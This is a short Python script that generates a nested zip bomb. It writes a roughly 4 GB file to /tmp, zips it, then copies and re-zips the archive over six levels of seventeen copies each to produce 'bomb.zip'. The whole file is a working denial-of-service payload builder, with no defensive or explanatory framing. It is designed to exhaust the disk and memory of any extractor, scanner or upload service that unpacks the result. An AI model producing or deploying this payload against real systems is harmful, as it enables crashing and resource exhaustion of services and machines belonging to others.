import os

depth = 6
width = 17

zip_file = 'bomb.zip'
tmp_dir = '/tmp/zip_bomb'
file_name = '0.txt'

mb = 1048576


def create_tmp_dir():
    if not os.path.exists(tmp_dir):
        os.makedirs(tmp_dir)

def create_zip(target, source):
    command = 'zip -rmj9 {} {}'.format(target, source)
    os.system(command)

def create_file():
    file_path = '{}/{}'.format(tmp_dir, file_name)
    f = open(file_path, 'w')
    # 4GB - 1byte (largest file that zip will currently compress)
    for i in range((1024 * 4) - 1):
        f.write('1' * mb)
    f.write('1' * (mb - 1))
    f.close()

    target = '{}/0-0.zip'.format(tmp_dir)
    create_zip(target, file_path)

def create_bomb():
    for d in range(depth):
        if d > 0:
            target = '{}/{}-0.zip'.format(tmp_dir, d)
            source = '{}/*.zip'.format(tmp_dir)
            create_zip(target, source)
        for w in range(1, width):
            command = 'cp {}/{}-0.zip {}/{}-{}.zip'.format(tmp_dir, d, tmp_dir, d, w)
            os.system(command)

create_tmp_dir()
create_file()
create_bomb()

source = '{}/*.zip'.format(tmp_dir)
create_zip(zip_file, source)
